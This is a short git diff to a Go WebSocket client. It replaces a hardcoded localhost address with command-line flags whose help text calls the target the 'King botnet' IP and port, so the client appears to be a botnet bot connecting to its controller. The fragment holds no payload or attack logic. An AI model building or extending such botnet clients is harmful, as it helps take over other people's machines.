@@ -1,6 +1,7 @@
 package main
 
 import (
+	"flag"
 	"log"
 	"net/url"
 	"os"
@@ -10,8 +11,13 @@ import (
 )
 
 func main() {
-	// Definir la URL del servidor WebSocket
-	u := url.URL{Scheme: "ws", Host: "localhost:8080", Path: "/ws"}
+	ip := flag.String("ip", "0.0.0.0", "King botnet IP direction")
+	port := flag.String("port", "8080", "King botnet port")
+	flag.Parse()
+
+	// Url definition for WebSocket
+	host := *ip + ":" + *port
+	u := url.URL{Scheme: "ws", Host: host, Path: "/ws"}
 	log.Printf("Connecting to %s", u.String())
 
 	// Establecer la conexión
